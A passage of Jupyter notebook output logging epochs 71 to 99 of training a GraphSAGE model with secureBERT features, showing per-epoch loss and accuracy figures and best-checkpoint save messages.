       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:58:15 | INFO | Epoch 71 | Train Loss: 0.1730 | Train Accuracy: 0.9556\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d8a1cfc7c6d047fcb8eb188e64a0b6a1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:58:17 | INFO | Validation Loss: 0.1470 | Validation Accuracy: 0.9618\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "cf85963a65df4e778f7752805e510734",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:58:37 | INFO | Epoch 72 | Train Loss: 0.1779 | Train Accuracy: 0.9542\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b4b2234f48644fb291c9fe982e30475c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:58:39 | INFO | Validation Loss: 0.1209 | Validation Accuracy: 0.9688\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_72_loss_0.1209_acc_0.9688\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fb2a606048b64dbcb479de0be788ad41",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:59:02 | INFO | Epoch 73 | Train Loss: 0.1952 | Train Accuracy: 0.9497\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "49569beabe974c92b4e8411213655c2f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:59:23 | INFO | Validation Loss: 0.1362 | Validation Accuracy: 0.9638\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8dfaa457a7aa430cbb09096afc5bd746",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:59:36 | INFO | Epoch 74 | Train Loss: 0.1870 | Train Accuracy: 0.9518\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "dc4a0c2d7a9447c2a0d380637c44c657",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:59:38 | INFO | Validation Loss: 0.1436 | Validation Accuracy: 0.9641\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a2b4d606b5a34ad7bec383acaee8cdbf",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:59:51 | INFO | Epoch 75 | Train Loss: 0.1768 | Train Accuracy: 0.9542\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "97b84f1c42604bf0afec5011a4f84e34",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:59:52 | INFO | Validation Loss: 0.1506 | Validation Accuracy: 0.9577\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0b8b77faa72649fe900c8ee6b1dc5860",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:00:06 | INFO | Epoch 76 | Train Loss: 0.1730 | Train Accuracy: 0.9553\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "23e68bd7d4904e259f413bd9ed358812",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:00:07 | INFO | Validation Loss: 0.1200 | Validation Accuracy: 0.9680\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_76_loss_0.1200_acc_0.9680\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "42ebdaa62b5d47369e97e5b19b4fc4cd",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:00:19 | INFO | Epoch 77 | Train Loss: 0.1778 | Train Accuracy: 0.9537\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "68c780cf17ca4b15a91c44a3e70d1526",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:00:21 | INFO | Validation Loss: 0.1206 | Validation Accuracy: 0.9684\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "eeaea0846b974acaabb3f21c9f66705c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:00:33 | INFO | Epoch 78 | Train Loss: 0.1701 | Train Accuracy: 0.9553\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bd502eec4f0047c781db989334ef4a36",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:00:35 | INFO | Validation Loss: 0.1275 | Validation Accuracy: 0.9655\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "cc3e9d5bcb03444486da8a009cb8d394",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:00:47 | INFO | Epoch 79 | Train Loss: 0.1784 | Train Accuracy: 0.9530\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7a61cbb84f424d538511981eafbeacd5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:00:49 | INFO | Validation Loss: 0.1359 | Validation Accuracy: 0.9645\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7b0d0903fb0249f99e3b69d60f02ecdd",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:01:02 | INFO | Epoch 80 | Train Loss: 0.1696 | Train Accuracy: 0.9554\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3f9c4f096ad2431b91aa8d0382e214db",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:01:04 | INFO | Validation Loss: 0.1251 | Validation Accuracy: 0.9662\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4c39d210cb7e4b43941b55d531c7d99b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:01:16 | INFO | Epoch 81 | Train Loss: 0.1575 | Train Accuracy: 0.9587\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5a509f09d27e4591b8be23f52320c4d4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:01:18 | INFO | Validation Loss: 0.1160 | Validation Accuracy: 0.9679\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_81_loss_0.1160_acc_0.9679\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "543e19a23e964fe2b5495f74ebb8e2f8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:01:31 | INFO | Epoch 82 | Train Loss: 0.1570 | Train Accuracy: 0.9588\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "aeb96190e87e47e4b7e1006ef6974a1f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:01:32 | INFO | Validation Loss: 0.1129 | Validation Accuracy: 0.9693\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_82_loss_0.1129_acc_0.9693\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d854a48956b04d58a8811d68a8b6c2fd",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:01:50 | INFO | Epoch 83 | Train Loss: 0.1520 | Train Accuracy: 0.9598\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a985149caa954990b22c801c40f24a6a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:01:52 | INFO | Validation Loss: 0.1258 | Validation Accuracy: 0.9643\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0670c9ad143645b7838c6943b28b7357",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:02:11 | INFO | Epoch 84 | Train Loss: 0.1600 | Train Accuracy: 0.9577\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1eb73049907b48f5aa4d95c3e871b74e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:02:13 | INFO | Validation Loss: 0.1208 | Validation Accuracy: 0.9671\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e3006781b1a446ccad46050f2a412c63",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:02:37 | INFO | Epoch 85 | Train Loss: 0.1576 | Train Accuracy: 0.9580\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4f26240766fa40e4a8264053142f558a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:02:41 | INFO | Validation Loss: 0.1221 | Validation Accuracy: 0.9659\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9f9fe4f8a2094217a8d0066182f16fa7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:02:59 | INFO | Epoch 86 | Train Loss: 0.1473 | Train Accuracy: 0.9608\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b8e00aa281b845c89e811ccfff223740",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:03:01 | INFO | Validation Loss: 0.1130 | Validation Accuracy: 0.9688\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2bf2d8c194314360b96aa074cdcdb162",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:03:18 | INFO | Epoch 87 | Train Loss: 0.1504 | Train Accuracy: 0.9600\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b2824de3ebde41e2aaa81db7a0382515",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:03:20 | INFO | Validation Loss: 0.1110 | Validation Accuracy: 0.9694\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_87_loss_0.1110_acc_0.9694\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "556eda493d5543dbb275ecae6ae32b80",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:03:32 | INFO | Epoch 88 | Train Loss: 0.1467 | Train Accuracy: 0.9608\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9dafb5388e384b89809fd447a75e092b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:03:33 | INFO | Validation Loss: 0.1129 | Validation Accuracy: 0.9685\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3012d06e94b7411cb5852755d4c79d1c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:03:46 | INFO | Epoch 89 | Train Loss: 0.1445 | Train Accuracy: 0.9614\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "863ce11970dd4ed08ded39f9cee8a7a6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:03:48 | INFO | Validation Loss: 0.1093 | Validation Accuracy: 0.9699\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_89_loss_0.1093_acc_0.9699\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e877a5ffbdf14811a19df179f95e88d5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:03:59 | INFO | Epoch 90 | Train Loss: 0.1451 | Train Accuracy: 0.9612\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f223496ab67d457dbde2dfbbf1fc5b8b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:04:01 | INFO | Validation Loss: 0.1202 | Validation Accuracy: 0.9679\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5127f595c9bc4bdfbb076ff26d43a459",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:04:13 | INFO | Epoch 91 | Train Loss: 0.1432 | Train Accuracy: 0.9614\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4c12290f966740d5bc887f6adead0c5c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:04:14 | INFO | Validation Loss: 0.1213 | Validation Accuracy: 0.9660\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bbee0367c206400f937683aba7a50c89",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:04:32 | INFO | Epoch 92 | Train Loss: 0.1396 | Train Accuracy: 0.9627\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b8df1316bba14921a6d62f6ba1597c7c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:04:34 | INFO | Validation Loss: 0.1246 | Validation Accuracy: 0.9658\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2761e76060f24571ba3d6320b080f8d6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:04:55 | INFO | Epoch 93 | Train Loss: 0.1368 | Train Accuracy: 0.9630\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "978d0f9238b246349fe70933765d1fde",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:04:57 | INFO | Validation Loss: 0.1042 | Validation Accuracy: 0.9708\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_93_loss_0.1042_acc_0.9708\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b7b37010aeaf490e8250fbf0c493872f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:05:20 | INFO | Epoch 94 | Train Loss: 0.1406 | Train Accuracy: 0.9618\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "cbf4d0dad1014c6983570d89fc068fff",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:05:23 | INFO | Validation Loss: 0.0938 | Validation Accuracy: 0.9746\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_94_loss_0.0938_acc_0.9746\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c8a62184344f42c48d29285a3cd4aac7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:05:40 | INFO | Epoch 95 | Train Loss: 0.1356 | Train Accuracy: 0.9637\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f3c14d4622c947108ba2c086c9c8db84",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:05:42 | INFO | Validation Loss: 0.0995 | Validation Accuracy: 0.9721\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "37135278931548778b3cd5eee22ca2d4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:05:54 | INFO | Epoch 96 | Train Loss: 0.1378 | Train Accuracy: 0.9630\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6d5530e80c794073981c74ac6ba1e4ad",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:05:55 | INFO | Validation Loss: 0.0942 | Validation Accuracy: 0.9743\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f00026a2cd824a79b3bb1401a7b4a0bb",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:06:07 | INFO | Epoch 97 | Train Loss: 0.1402 | Train Accuracy: 0.9620\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "91eb84363a2e4825910d3e5bac2eb51d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:06:08 | INFO | Validation Loss: 0.1062 | Validation Accuracy: 0.9703\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "22e39b009aa94987b15aab1e5a537d2e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:06:20 | INFO | Epoch 98 | Train Loss: 0.1384 | Train Accuracy: 0.9626\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e191883a5818443a93e3f695bfb264ed",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:06:22 | INFO | Validation Loss: 0.1338 | Validation Accuracy: 0.9627\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b511c6814af84eb6b3b6854a6c11b1f7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:06:34 | INFO | Epoch 99 | Train Loss: 0.1392 | Train Accuracy: 0.9626\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "296c0d8e88bb4f50b64923d16be5a9f2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:06:37 | INFO | Validation Loss: 0.1060 | Validation Accuracy: 0.9704\n",
      "\n"
     ]
    },
    {
     "data": {
